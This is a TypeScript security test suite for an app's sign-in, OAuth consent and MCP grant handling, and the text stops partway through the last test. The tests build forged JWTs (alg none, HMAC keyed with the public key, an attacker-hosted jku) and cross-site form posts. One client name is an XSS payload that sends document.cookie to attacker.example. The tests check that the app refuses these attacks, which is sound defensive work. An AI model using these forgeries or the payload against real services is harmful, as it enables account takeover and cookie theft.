import { SELF } from "cloudflare:test";
import { beforeAll, describe, expect, it } from "vitest";
import { API_ROUTES } from "@garderobe/contracts/ext/api";
import {
  APP_ORIGIN,
  ApiClient,
  MCP_ORIGIN,
  MCP_URL,
  accessAssertion,
  bindings,
  connectMcp,
  createWorld,
  decideConsent,
  errorOf,
  fingerprint,
  newIdentity,
  ownerDay,
  settledOwnerSnapshot,
  sql,
  toolResult,
  type TestOwner,
  type World,
} from "../src/harness.ts";

/*
 * THREAT CLASS 2: authentication, OAuth, scope and grant abuse.
 *
 * Sign-in is Cloudflare Access in a deployment. Here assertions are signed with a key generated for the
 * test run (a LABELLED STAND-IN for the Access edge) and verified by the Worker's ordinary verification
 * code; everything behind that is real: identity mapping, sessions, the router, the Workers OAuth
 * provider on local KV, the grant table in D1 and the MCP server. Nothing here proves how the real Access
 * edge or a real consumer assistant behaves.
 */
let world: World;
let owner: TestOwner; // the real owner fixture (victim)
let other: TestOwner; // the labelled synthetic second owner (attacker)

const b64url = (bytes: Uint8Array | string): string => {
  const data = typeof bytes === "string" ? new TextEncoder().encode(bytes) : bytes;
  let binary = "";
  for (const byte of data) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

const claimsFor = (identity: { subject: string; email: string | null }, overrides: Record<string, unknown> = {}) => {
  const now = Math.floor(Date.now() / 1000);
  const b = bindings();
  return { sub: identity.subject, email: identity.email, type: "app", iss: b.ACCESS_TEAM_DOMAIN, aud: b.ACCESS_AUD, iat: now, exp: now + 3600, ...overrides };
};

/** A JWT built by hand so that the header, the claims and the signature can each be wrong on purpose. */
async function craftJwt(header: Record<string, unknown>, claims: Record<string, unknown>, signer: "trusted" | "untrusted" | "hmac_with_public_key" | "none" | "garbage"): Promise<string> {
  const b = bindings();
  const input = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(claims))}`;
  if (signer === "none") return `${input}.`;
  if (signer === "garbage") return `${input}.${b64url(crypto.getRandomValues(new Uint8Array(256)))}`;
  if (signer === "hmac_with_public_key") {
    // Algorithm confusion: sign with HMAC using the PUBLIC key material as the secret.
    const publicJwk = JSON.parse(b.ACCESS_JWKS_JSON!).keys[0];
    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(JSON.stringify(publicJwk)), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
    return `${input}.${b64url(new Uint8Array(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(input))))}`;
  }
  const jwk = JSON.parse(signer === "trusted" ? b.TEST_ACCESS_PRIVATE_JWK : b.TEST_UNTRUSTED_PRIVATE_JWK);
  const key = await crypto.subtle.importKey("jwk", { ...jwk, alg: "RS256", key_ops: ["sign"] }, { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" }, false, ["sign"]);
  return `${input}.${b64url(new Uint8Array(await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, new TextEncoder().encode(input))))}`;
}

const me = (headers: Record<string, string>, origin = APP_ORIGIN) => SELF.fetch(`${origin}/v1/me`, { headers });

/** Who a request was served as, or null when it was refused. */
async function servedAs(response: Response): Promise<string | null> {
  if (!response.ok) {
    await response.text();
    return null;
  }
  return ((await response.json()) as { userId: string }).userId;
}

const rpc = (token: string, body: unknown, extra: Record<string, string> = {}, origin = MCP_ORIGIN) =>
  SELF.fetch(`${origin}/mcp`, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json, text/event-stream", Authorization: `Bearer ${token}`, ...extra }, body: JSON.stringify(body) });

const toolsCall = (name: string, args: Record<string, unknown>, id = 1) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } });

interface RawClient {
  clientId: string;
  redirectUri: string;
  verifier: string;
  challenge: string;
}

async function registerClient(redirectUri: string, name = "Raw adversarial client (test)"): Promise<RawClient> {
  const response = await SELF.fetch(`${MCP_ORIGIN}/oauth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ client_name: name, redirect_uris: [redirectUri], grant_types: ["authorization_code", "refresh_token"], response_types: ["code"], token_endpoint_auth_method: "none" }),
  });
  if (!response.ok) throw new Error(`fixture: registration failed ${response.status} ${await response.text()}`);
  const verifier = b64url(crypto.getRandomValues(new Uint8Array(32)));
  const challenge = b64url(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier))));
  return { clientId: ((await response.json()) as { client_id: string }).client_id, redirectUri, verifier, challenge };
}

function authorizeUrl(client: RawClient, overrides: Record<string, string> = {}): URL {
  const url = new URL(`${APP_ORIGIN}/oauth/authorize`);
  url.search = new URLSearchParams({ response_type: "code", client_id: client.clientId, redirect_uri: client.redirectUri, scope: "wardrobe.read wardrobe.write", state: `st-${crypto.randomUUID()}`, code_challenge: client.challenge, code_challenge_method: "S256", resource: MCP_URL, ...overrides }).toString();
  return url;
}

const tokenRequest = (form: Record<string, string>, origin = MCP_ORIGIN) => SELF.fetch(`${origin}/oauth/token`, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(form).toString() });

/** Run the owner's consent for a raw client and return the authorization code. */
async function consentCode(who: TestOwner, client: RawClient, decision: { allow: boolean; write?: boolean } = { allow: true, write: true }, overrides: Record<string, string> = {}): Promise<{ code: string | null; location: string | null; status: number }> {
  const consent = await decideConsent(who, authorizeUrl(client, overrides), decision);
  const code = consent.location ? new URL(consent.location).searchParams.get("code") : null;
  return { code, location: consent.location, status: consent.status };
}

const activeGrants = async (who: TestOwner) => (await sql<{ grant_id: string; scopes_json: string; client_name: string }>("SELECT grant_id, scopes_json, client_name FROM mcp_grants WHERE user_id = ? AND status = 'active' ORDER BY granted_at", who.userId));

/**
 * Everything stored for an owner (every row of every owner table and its stored objects, read once the
 * owner's background work has gone quiet) plus the ledger fingerprint: equal values mean nothing changed.
 */
const storedState = async (who: TestOwner) => ({ rows: await settledOwnerSnapshot(who, { label: "the owner's stored records" }), ledger: await fingerprint(who) });

interface ConsentPage {
  status: number;
  location: string | null;
  html: string;
  /** The transaction handle of the form (HTML character references decoded), or null when there is no form. */
  handle: string | null;
  /** The cookies the page set (the consent's browser binding), as a `Cookie` header value. */
  cookies: string;
}

/** Open the consent page of an authorization request in an owner's browser session, without deciding. */
async function openConsent(who: TestOwner, url: URL): Promise<ConsentPage> {
  const page = await SELF.fetch(url.toString(), { headers: await who.api.with({ client: "web" }).headers(), redirect: "manual" });
  const html = await page.text();
  const raw = /name="handle" value="([^"]+)"/.exec(html)?.[1];
  const handle = raw === undefined ? null : raw.replace(/&#(\d+);/g, (_match: string, code: string) => String.fromCharCode(Number(code))).replace(/&amp;/g, "&");
  const cookies = page.headers.getSetCookie().map((c) => c.split(";")[0]!).join("; ");
  return { status: page.status, location: page.headers.get("Location"), html, handle, cookies };
}

type RpcMessage = Record<string, any>;

/** The JSON-RPC messages of an MCP answer, sent as JSON or as an event stream ([] for an empty body). */
function rpcMessages(text: string): RpcMessage[] {
  const trimmed = text.trim();
  if (trimmed === "") return [];
  const parsed: unknown[] = [];
  if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
    const value: unknown = JSON.parse(trimmed);
    parsed.push(...(Array.isArray(value) ? value : [value]));
  } else {
    for (const line of trimmed.split(/\r?\n/)) {
      if (!line.startsWith("data:")) continue;
      const data = line.slice(5).trim();
      if (data !== "") parsed.push(JSON.parse(data));
    }
  }
  return parsed.filter((m): m is RpcMessage => m !== null && typeof m === "object" && !Array.isArray(m));
}

/** A JSON-RPC error answer. */
const isRpcError = (m: RpcMessage): boolean => m.error !== null && typeof m.error === "object" && typeof m.error.code === "number";
/** A tool call answered with the tool's own error result (`isError: true`): the call was not served. */
const isToolFailure = (m: RpcMessage): boolean => m.result !== null && typeof m.result === "object" && m.result.isError === true;
/** A tool call that was served. */
const isToolSuccess = (m: RpcMessage): boolean => m.result !== null && typeof m.result === "object" && Array.isArray(m.result.content) && m.result.isError !== true;

beforeAll(async () => {
  world = await createWorld();
  owner = world.real;
  other = world.synthetic;
});

/* ------------------------------------------------------------------ */

describe("forged and malformed sign-in assertions", () => {
  it("refuses every assertion that the Access key did not sign, whatever it claims", async () => {
    const victim = owner.identity;
    const good = { alg: "RS256", kid: "test-access-key", typ: "JWT" };
    const forgeries: [string, string][] = [
      ["signed by another key", await craftJwt(good, claimsFor(victim), "untrusted")],
      ["signed by another key that the header embeds", await craftJwt({ ...good, jwk: JSON.parse(bindings().TEST_UNTRUSTED_PRIVATE_JWK) }, claimsFor(victim), "untrusted")],
      ["signed by another key named by a jku header", await craftJwt({ ...good, jku: "https://attacker.example/keys.json", kid: "attacker" }, claimsFor(victim), "untrusted")],
      ["alg none", await craftJwt({ alg: "none", typ: "JWT" }, claimsFor(victim), "none")],
      ["alg None", await craftJwt({ alg: "None" }, claimsFor(victim), "none")],
      ["alg NONE with a signature", await craftJwt({ alg: "NONE", kid: "test-access-key" }, claimsFor(victim), "garbage")],
      ["HS256 keyed with the public key", await craftJwt({ alg: "HS256", kid: "test-access-key" }, claimsFor(victim), "hmac_with_public_key")],
      ["random signature", await craftJwt(good, claimsFor(victim), "garbage")],
      ["RS256 header without a signature", await craftJwt(good, claimsFor(victim), "none")],
    ];
    // A real assertion of the ATTACKER whose claims were swapped for the victim's after signing.
    const real = await accessAssertion(other.identity);
    const [h, , s] = real.split(".");
    forgeries.push(["claims swapped under a valid signature", `${h}.${b64url(JSON.stringify(claimsFor(victim)))}.${s}`]);
    for (const [label, token] of forgeries) {
      for (const headers of [{ "Cf-Access-Jwt-Assertion": token }, { Cookie: `CF_Authorization=${token}` }, { Authorization: `Bearer ${token}` }] as Record<string, string>[]) {
        const response = await me(headers);
        expect(response.status, `${label} via ${Object.keys(headers)[0]}`).toBe(401);
        await response.text();
      }
    }
  });

  it("refuses a correctly signed assertion with missing or wrong claims", async () => {
    const good = { alg: "RS256", kid: "test-access-key" };
    const now = Math.floor(Date.now() / 1000);
    const without = (key: string) => {
      const claims: Record<string, unknown> = claimsFor(owner.identity);
      delete claims[key];
      return claims;
    };
    const cases: [string, Record<string, unknown>][] = [
      ["no exp", without("exp")],
      ["no iat", without("iat")],
      ["no sub", without("sub")],
      ["no aud", without("aud")],
      ["no iss", without("iss")],
      ["empty sub", claimsFor(owner.identity, { sub: "" })],
      ["sub is an object", claimsFor(owner.identity, { sub: { toString: owner.identity.subject } })],
      ["sub is an array", claimsFor(owner.identity, { sub: [owner.identity.subject] })],
      ["expired", claimsFor(owner.identity, { iat: now - 7200, exp: now - 3600 })],
      ["not yet valid", claimsFor(owner.identity, { nbf: now + 3600 })],
      ["another audience", claimsFor(owner.identity, { aud: "another-access-application" })],
      ["audience list without ours", claimsFor(owner.identity, { aud: ["a", "b"] })],
      ["issuer with a suffix", claimsFor(owner.identity, { iss: `${bindings().ACCESS_TEAM_DOMAIN}.attacker.example` })],
      ["issuer with a path", claimsFor(owner.identity, { iss: `${bindings().ACCESS_TEAM_DOMAIN}/` })],
      ["exp as a string far in the future", claimsFor(owner.identity, { exp: "99999999999" })],
    ];
    for (const [label, claims] of cases) {
      const response = await me({ "Cf-Access-Jwt-Assertion": await craftJwt(good, claims, "trusted") });
      expect(response.status, label).toBe(401);
      await response.text();
    }
    // The control: the same builder with correct claims is accepted, so the refusals above are about the claims.
    expect(await servedAs(await me({ "Cf-Access-Jwt-Assertion": await craftJwt(good, claimsFor(owner.identity), "trusted") }))).toBe(owner.userId);
  });

  it("never serves the victim when a valid assertion of the attacker is mixed with a forged one of the victim", async () => {
    const forgedVictim = await craftJwt({ alg: "RS256", kid: "test-access-key" }, claimsFor(owner.identity), "untrusted");
    const realAttacker = await accessAssertion(other.identity);
    const mixes: Record<string, string>[] = [
      { "Cf-Access-Jwt-Assertion": realAttacker, Cookie: `CF_Authorization=${forgedVictim}` },
      { "Cf-Access-Jwt-Assertion": forgedVictim, Cookie: `CF_Authorization=${realAttacker}` },
      { "Cf-Access-Jwt-Assertion": realAttacker, Authorization: `Bearer ${forgedVictim}` },
      { Cookie: `CF_Authorization=${forgedVictim}; CF_Authorization=${realAttacker}` },
      { Cookie: `CF_Authorization=${realAttacker}; CF_Authorization=${forgedVictim}` },
      { "Cf-Access-Jwt-Assertion": realAttacker, "Cf-Access-Authenticated-User-Email": owner.identity.email!, "X-Forwarded-User": owner.userId, "X-Garderobe-User": owner.userId },
    ];
    for (const headers of mixes) {
      const who = await servedAs(await me(headers));
      expect([null, other.userId], JSON.stringify(Object.keys(headers))).toContain(who);
    }
  });

  it("answers hostile assertion values with 401, never a server error", async () => {
    const values = ["", ".", "..", "a.b.c", "null", "undefined", "{}", "Bearer x", "ey" + "A".repeat(120_000), `${b64url("{")}.${b64url("{")}.x`, `${b64url('{"alg":"RS256"}')}.${b64url("not json")}.AAAA`, "\u0000.\u0000.\u0000".replace(/\u0000/g, "%00")];
    for (const value of values) {
      const response = await me({ "Cf-Access-Jwt-Assertion": value });
      expect(response.status, value.slice(0, 30)).toBe(401);
      const text = await response.text();
      expect(text).not.toMatch(/at \w+ \(|\.ts:\d+/); // no stack trace
    }
  });
});

describe("every Access-trust route", () => {
  const concrete = (path: string) => path.replace(/\{[^}]+\}/g, "x");
  const accessRoutes = API_ROUTES.filter((r) => r.trust === "access" || r.trust === "access_identity");

  it("refuses a request with no assertion, with a forged assertion, and on the MCP hostname", async () => {
    expect(accessRoutes.length).toBeGreaterThan(60);
    const forged = await craftJwt({ alg: "RS256", kid: "test-access-key" }, claimsFor(owner.identity), "untrusted");
    const valid = await accessAssertion(owner.identity);
    const before = await storedState(owner);
    const failures: string[] = [];
    for (const route of accessRoutes) {
      const path = concrete(route.path);
      const init = (headers: Record<string, string>): RequestInit => ({ method: route.method, headers: { ...headers, ...(route.method === "GET" ? {} : { "Content-Type": "application/json" }) }, ...(route.method === "GET" ? {} : { body: "{}" }), redirect: "manual" });
      const anonymous = await SELF.fetch(`${APP_ORIGIN}${path}`, init({}));
      if (anonymous.status !== 401) failures.push(`${route.method} ${route.path} without assertion -> ${anonymous.status}`);
      await anonymous.text();
      const withForged = await SELF.fetch(`${APP_ORIGIN}${path}`, init({ "Cf-Access-Jwt-Assertion": forged }));
      if (withForged.status !== 401) failures.push(`${route.method} ${route.path} with a forged assertion -> ${withForged.status}`);
      await withForged.text();
      // A VALID assertion on the hostname that is not behind Access is worth nothing.
      const wrongHost = await SELF.fetch(`${MCP_ORIGIN}${path}`, init({ "Cf-Access-Jwt-Assertion": valid }));
      if (wrongHost.status !== 401) failures.push(`${route.method} ${route.path} on the MCP hostname -> ${wrongHost.status}`);
      await wrongHost.text();
    }
    expect(failures).toEqual([]);
    expect(await storedState(owner)).toEqual(before);
  });

  it("gives a verified but unlinked identity nothing on any owner route", async () => {
    const stranger = new ApiClient(newIdentity("adv-stranger"));
    const failures: string[] = [];
    for (const route of API_ROUTES.filter((r) => r.trust === "access")) {
      const response = await stranger.request(route.method, concrete(route.path), route.method === "GET" ? {} : { body: {} });
      if (response.status !== 403) failures.push(`${route.method} ${route.path} -> ${response.status}`);
      else if ((await errorOf(response)).code !== "identity_not_linked") failures.push(`${route.method} ${route.path} -> 403 with another code`);
    }
    expect(failures).toEqual([]);
  });

  it("does not accept a connected assistant's token, in any header, as a sign-in", async () => {
    const mcp = await connectMcp(other, { write: true, clientName: "Token reuse probe (test)" });
    const { accessToken, refreshToken } = mcp.oauth.snapshot();
    for (const token of [accessToken, refreshToken!]) {
      for (const headers of [{ Authorization: `Bearer ${token}` }, { "Cf-Access-Jwt-Assertion": token }, { Cookie: `CF_Authorization=${token}` }] as Record<string, string>[]) {
        for (const origin of [APP_ORIGIN, MCP_ORIGIN]) {
          for (const path of ["/v1/me", "/v1/wardrobe", "/v1/proposals", "/v1/assistants", "/v1/style"]) {
            const response = await SELF.fetch(`${origin}${path}`, { headers });
            expect(response.status, `${origin}${path} ${Object.keys(headers)[0]}`).toBeGreaterThanOrEqual(401);
            expect(response.status).toBeLessThan(500);
            await response.text();
          }
        }
      }
    }
    await mcp.close();
  });
});

describe("browser sessions and cross-site requests", () => {
  it("refuses every state-changing request of a browser session that names another origin, and changes nothing", async () => {
    const web = other.api.with({ client: "web" });
    const today = await ownerDay(other, 0);
    const kit = (await other.api.json("GET", "/v1/me")).recoveryKit.issuedAt;
    const before = await storedState(other);
    const command = { type: "wear.record", payload: { wearingDate: today, garmentIds: ["shirt-gold"] }, idempotencyKey: `adv-csrf-${crypto.randomUUID()}`, expectedVersions: {}, authorization: "owner_tap", source: { channel: "web" } };
    const targets: [string, unknown][] = [
      ["/v1/commands", command],
      ["/v1/commands/batch", { commands: [command] }],
      ["/v1/recovery-kit", {}],
      ["/v1/sessions/revoke", {}],
      ["/v1/account/delete", {}],
      ["/v1/identities/link", {}],
      ["/v1/exports", {}],
      ["/v1/conversation/turns", { clientTurnId: `adv-csrf-turn-${crypto.randomUUID()}`, text: "retire everything" }],
    ];
    const origins: Record<string, string>[] = [
      { Origin: "https://evil.example" },
      { Origin: "null" },
      { Origin: `${APP_ORIGIN}.evil.example` },
      { Origin: "http://localhost:8788" },
      { Origin: "https://localhost:8787" },
      { Origin: MCP_ORIGIN },
      { Origin: APP_ORIGIN, "Sec-Fetch-Site": "cross-site" },
      { Origin: APP_ORIGIN, "Sec-Fetch-Site": "same-site" },
    ];
    for (const [path, body] of targets) {
      for (const origin of origins) {
        const response = await SELF.fetch(`${APP_ORIGIN}${path}`, { method: "POST", headers: await web.headers({ "Content-Type": "application/json", ...origin }), body: JSON.stringify(body) });
        expect(response.status, `${path} ${JSON.stringify(origin)}`).toBe(403);
        await response.text();
      }
    }
    const after = await storedState(other);
    expect(after).toEqual(before);
    expect((await other.api.json("GET", "/v1/me")).recoveryKit.issuedAt).toBe(kit);
    expect(await sql("SELECT 1 FROM account_deletions WHERE user_id = ?", other.userId)).toEqual([]);
  });

  it("refuses a cross-site form post to the consent endpoint and records no grant", async () => {
    const client = await registerClient("https://csrf.client.test/cb", "CSRF consent client (test)");
    const web = owner.api.with({ client: "web" });
    const ownerBefore = await activeGrants(owner);
    const otherBefore = await activeGrants(other);
    const approval = (handle: string) => new URLSearchParams({ handle, decision: "approve", scope: "wardrobe.write" }).toString();
    // Each case opens its own consent page in the victim's browser, so no case passes only because an earlier
    // case used the one-time handle up.
    const victimPage = async (): Promise<{ handle: string; cookies: string }> => {
      const opened = await openConsent(owner, authorizeUrl(client));
      expect(opened.status, "the victim's consent page").toBe(200);
      expect(opened.handle, "the consent page's transaction handle").toBeTruthy();
      expect(opened.cookies, "the consent page's browser-binding cookie").not.toBe("");
      return { handle: opened.handle!, cookies: opened.cookies };
    };
    // 1. From another site, with every cookie the browser would attach.
    const first = await victimPage();
    const crossSite = await SELF.fetch(`${APP_ORIGIN}/oauth/authorize`, { method: "POST", headers: await web.headers({ "Content-Type": "application/x-www-form-urlencoded", Cookie: first.cookies, Origin: "https://evil.example" }), body: approval(first.handle), redirect: "manual" });
    expect(crossSite.status).toBe(403);
    await crossSite.text();
    // 2. Same origin, but without the cookie that binds the consent to the browser that opened the page.
    const second = await victimPage();
    const unbound = await SELF.fetch(`${APP_ORIGIN}/oauth/authorize`, { method: "POST", headers: await web.headers({ "Content-Type": "application/x-www-form-urlencoded" }), body: approval(second.handle), redirect: "manual" });
    expect(unbound.headers.get("Location") ?? "").not.toContain("code=");
    await unbound.text();
    // 3. The ATTACKER's own signed-in browser posting the victim's handle together with the victim's
    //    binding cookie (as if both had been stolen): no grant for anyone.
    const third = await victimPage();
    const attackerHeaders = await other.api.with({ client: "web" }).headers({ "Content-Type": "application/x-www-form-urlencoded", Cookie: third.cookies });
    expect(attackerHeaders.Cookie, "the attacker's request carries the victim's binding cookie").toContain(third.cookies);
    const stolen = await SELF.fetch(`${APP_ORIGIN}/oauth/authorize`, { method: "POST", headers: attackerHeaders, body: approval(third.handle), redirect: "manual" });
    await stolen.text();
    expect(stolen.status, "the stolen consent's answer").toBeGreaterThanOrEqual(300);
    expect(stolen.status, "the stolen consent's answer").toBeLessThan(500);
    expect(stolen.headers.get("Location") ?? "", "the stolen consent's redirect").not.toContain("code=");
    expect(await activeGrants(owner)).toEqual(ownerBefore);
    expect(await activeGrants(other)).toEqual(otherBefore);
    expect(await sql("SELECT user_id, grant_id, status FROM mcp_grants WHERE client_name = ?", "CSRF consent client (test)"), "grants of any owner for the CSRF client").toEqual([]);
  });

  it("shows the consent page with client-supplied text escaped, framing forbidden and nothing stored for an invalid request", async () => {
    const hostile = await registerClient("https://xss.client.test/cb", `"><img src=x onerror=alert(1)><script>fetch('https://attacker.example/'+document.cookie)</script>`);
    const web = owner.api.with({ client: "web" });
    const page = await SELF.fetch(authorizeUrl(hostile).toString(), { headers: await web.headers(), redirect: "manual" });
    expect(page.status).toBe(200);
    const html = await page.text();
    expect(html).not.toContain("<script>fetch(");
    expect(html).not.toContain("<img src=x");
    const csp = page.headers.get("Content-Security-Policy") ?? "";
    expect(csp).toContain("frame-ancestors 'none'");
    // A redirect URI the client never registered must not receive anything, not even an error redirect.
    for (const overrides of [{ redirect_uri: "https://attacker.example/steal" }, { redirect_uri: "https://xss.client.test/cb/../../attacker" }, { redirect_uri: "https://xss.client.test.attacker.example/cb" }, { redirect_uri: "javascript:alert(1)" }, { client_id: "no-such-client" }] as Record<string, string>[]) {
      const bad = await SELF.fetch(authorizeUrl(hostile, overrides).toString(), { headers: await web.headers(), redirect: "manual" });
      const location = bad.headers.get("Location") ?? "";
      expect(location, JSON.stringify(overrides)).not.toContain("attacker");
      expect(location, JSON.stringify(overrides)).not.toMatch(/^javascript:/);
      expect(await bad.text(), JSON.stringify(overrides)).not.toContain('name="handle"');
    }
  });
  it("[fixed A02-1] the consent page carries the script-blocking content security policy the Worker intends for it", async () => {
    // The page's only defence against a script in client-supplied text would otherwise be escaping alone.
    const client = await registerClient("https://csp.client.test/cb", "CSP probe client (test)");
    const page = await SELF.fetch(authorizeUrl(client).toString(), { headers: await owner.api.with({ client: "web" }).headers(), redirect: "manual" });
    expect(page.status).toBe(200);
    await page.text();
    const csp = page.headers.get("Content-Security-Policy") ?? "";
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toMatch(/default-src 'none'|script-src 'none'/);
  });
});

describe("the authorization-code flow under abuse", () => {
  it("refuses an authorization code with a wrong or missing PKCE verifier, another client, or another redirect URI, and a replayed code", async () => {
    const client = await registerClient("https://raw.client.test/cb");
    const second = await registerClient("https://second.client.test/cb", "Second raw client (test)");
    const exchange = (code: string, overrides: Record<string, string> = {}, omit: string[] = []) => {
      const form: Record<string, string> = { grant_type: "authorization_code", code, redirect_uri: client.redirectUri, client_id: client.clientId, code_verifier: client.verifier, resource: MCP_URL, ...overrides };
      for (const key of omit) delete form[key];
      return tokenRequest(form);
    };
    const attempts: [string, Record<string, string>, string[]][] = [
      ["wrong verifier", { code_verifier: b64url(crypto.getRandomValues(new Uint8Array(32))) }, []],
      ["no verifier", {}, ["code_verifier"]],
      ["the challenge sent as the verifier", { code_verifier: client.challenge }, []],
      ["another client", { client_id: second.clientId, redirect_uri: second.redirectUri, code_verifier: second.verifier }, []],
      ["another redirect URI", { redirect_uri: "https://attacker.example/cb" }, []],
    ];
    for (const [label, overrides, omit] of attempts) {
      const { code } = await consentCode(owner, client);
      expect(code, label).toBeTruthy();
      const response = await exchange(code!, overrides, omit);
      expect(response.status, label).toBeGreaterThanOrEqual(400);
      expect(JSON.stringify(await response.json()), label).not.toContain("access_token");
    }
    // A good exchange, then the same code again.
    const { code } = await consentCode(owner, client);
    const first = await exchange(code!);
    expect(first.status).toBe(200);
    const tokens = (await first.json()) as { access_token: string; refresh_token: string };
    const replay = await exchange(code!);
    expect(replay.status).toBeGreaterThanOrEqual(400);
    expect(JSON.stringify(await replay.json())).not.toContain("access_token");
    // The token endpoint is not served on the app hostname.
    const onApp = await tokenRequest({ grant_type: "refresh_token", refresh_token: tokens.refresh_token, client_id: client.clientId, resource: MCP_URL }, APP_ORIGIN);
    expect(JSON.stringify(await onApp.text())).not.toContain("access_token");
  });

  it("records no grant when the owner denies, and gives a read-only grant when the owner leaves writing unticked", async () => {
    const client = await registerClient("https://scope.client.test/cb", "Scope client (test)");
    const before = (await activeGrants(owner)).length;
    const denied = await consentCode(owner, client, { allow: false });
    expect(denied.code).toBeNull();
    expect((await activeGrants(owner)).length).toBe(before);

    // The client asked for writing; the owner allowed reading only.
    const { code } = await consentCode(owner, client, { allow: true, write: false });
    const tokens = (await (await tokenRequest({ grant_type: "authorization_code", code: code!, redirect_uri: client.redirectUri, client_id: client.clientId, code_verifier: client.verifier, resource: MCP_URL })).json()) as { access_token: string; refresh_token: string; scope?: string };
    expect(tokens.access_token).toBeTruthy();
    const grant = (await activeGrants(owner)).find((g) => g.client_name === "Scope client (test)")!;
    expect(JSON.parse(grant.scopes_json)).toEqual(["wardrobe.read"]);

    const ledger = await fingerprint(owner);
    // A launderable garment the owner holds clean, so marking it dirty is a valid command (proved by the control at the end).
    const garment = (await sql<{ garment_id: string }>("SELECT g.garment_id FROM garments g JOIN stock_balances s ON s.user_id = g.user_id AND s.garment_id = g.garment_id WHERE g.user_id = ? AND g.acquisition = 'owned' AND g.care_channel <> 'none' AND s.bucket = 'clean' AND s.quantity > 0 ORDER BY g.garment_id LIMIT 1", owner.userId))[0]!.garment_id;
    const writeArgs = () => ({ type: "care.mark_dirty", payload: { items: [{ garmentId: garment, quantity: 1 }] }, idempotencyKey: `adv-ro-${crypto.randomUUID()}` });
    const write = toolsCall("garderobe_command", writeArgs());
    // The plain call, a JSON-RPC batch, a notification (no id), and the legacy protocol header.
    const bodies: [string, unknown, Record<string, string>][] = [
      ["plain", write, {}],
      ["batch", [write], {}],
      ["batch of two", [{ jsonrpc: "2.0", id: 7, method: "tools/list" }, { ...write, id: 8 }], {}],
      ["notification", { jsonrpc: "2.0", method: "tools/call", params: write.params }, {}],
      ["legacy protocol header", write, { "Mcp-Protocol-Version": "2025-11-25" }],
      ["modern protocol header", write, { "Mcp-Protocol-Version": "2026-07-28" }],
      ["tool name in another case", toolsCall("GARDEROBE_COMMAND", write.params.arguments), {}],
      ["tool name with a trailing space", toolsCall("garderobe_command ", write.params.arguments), {}],
    ];
    const commandsBefore = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM commands WHERE user_id = ?", owner.userId))[0]!.n;
    const waiting = async () => (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM submitted_proposals WHERE user_id = ?", owner.userId))[0]!.n;
    const waitingBefore = await waiting();
    for (const [label, body, extra] of bodies) {
      const response = await rpc(tokens.access_token, body, extra);
      await response.text();
      expect(response.status, label).toBeLessThan(500);
      // The proof is the ledger: no command row was written for the owner by any of these shapes, and no request
      // was left waiting for the owner either.
      expect((await sql<{ n: number }>("SELECT COUNT(*) AS n FROM commands WHERE user_id = ?", owner.userId))[0]!.n, label).toBe(commandsBefore);
      expect(await waiting(), `${label}: a request was left for the owner`).toBe(waitingBefore);
    }
    // A read-only connection does not list the write tool. Checked with the original access token before any
    // refresh below can rotate it: the answer must be a successful tools/list that names the read tools.
    const listed = await rpc(tokens.access_token, { jsonrpc: "2.0", id: 3, method: "tools/list" });
    expect(listed.status).toBe(200);
    const listedMessages = rpcMessages(await listed.text());
    const listResult = listedMessages.find((m) => m.id === 3 && m.result && Array.isArray(m.result.tools));
    expect(listResult, "a successful tools/list answer").toBeTruthy();
    const toolNames = (listResult!.result.tools as { name: string }[]).map((t) => t.name);
    expect(toolNames).toContain("garderobe_inventory");
    expect(toolNames).not.toContain("garderobe_command");
    // Asking the token endpoint for more than was granted does not widen the grant.
    const widened = await tokenRequest({ grant_type: "refresh_token", refresh_token: tokens.refresh_token, client_id: client.clientId, resource: MCP_URL, scope: "wardrobe.read wardrobe.write" });
    if (widened.ok) {
      const next = (await widened.json()) as { access_token: string };
      const response = await rpc(next.access_token, write);
      await response.text();
    } else await widened.text();
    expect(JSON.parse((await activeGrants(owner)).find((g) => g.client_name === "Scope client (test)")!.scopes_json)).toEqual(["wardrobe.read"]);
    expect(await fingerprint(owner)).toEqual(ledger);
    expect(await waiting()).toBe(waitingBefore);
    // Control: the same command from a connection the owner allowed to write is carried out, so the refusals above
    // were the missing write scope and not an invalid request. It is undone at once.
    const writer = await connectMcp(owner, { write: true, clientName: "Scope control writer (test)", redirectUri: "https://scope-control.client.test/cb" });
    const done = toolResult(await writer.client.callTool({ name: "garderobe_command", arguments: writeArgs() }));
    expect(done.ok, JSON.stringify(done.error)).toBe(true);
    expect((await sql<{ n: number }>("SELECT COUNT(*) AS n FROM commands WHERE user_id = ?", owner.userId))[0]!.n).toBe(commandsBefore + 1);
    const undone = toolResult(await writer.client.callTool({ name: "garderobe_command", arguments: { type: "command.undo", payload: { commandId: done.data.receipt.commandId }, idempotencyKey: `adv-ro-undo-${crypto.randomUUID()}` } }));
    expect(undone.ok, JSON.stringify(undone.error)).toBe(true);
    await writer.close();
  });

  it("applies the grant recorded in the database, not what the token claims: a narrowed or revoked grant takes effect at the next request", async () => {
    const mcp = await connectMcp(other, { write: true, clientName: "Narrowed assistant (test)", redirectUri: "https://narrow.client.test/cb" });
    const { accessToken, refreshToken, clientId } = mcp.oauth.snapshot();
    const args = () => ({ type: "care.mark_dirty", payload: { items: [{ garmentId: "shirt-slate", quantity: 1 }] }, idempotencyKey: `adv-narrow-${crypto.randomUUID()}` });
    const ok = await rpc(accessToken, toolsCall("garderobe_command", args()));
    expect(await ok.text()).toContain("commandId");
    // The owner's record of the grant is narrowed to reading (as a later, stricter consent would).
    await sql("UPDATE mcp_grants SET scopes_json = '[\"wardrobe.read\"]' WHERE user_id = ? AND client_name = ? RETURNING grant_id", other.userId, "Narrowed assistant (test)");
    const before = await fingerprint(other);
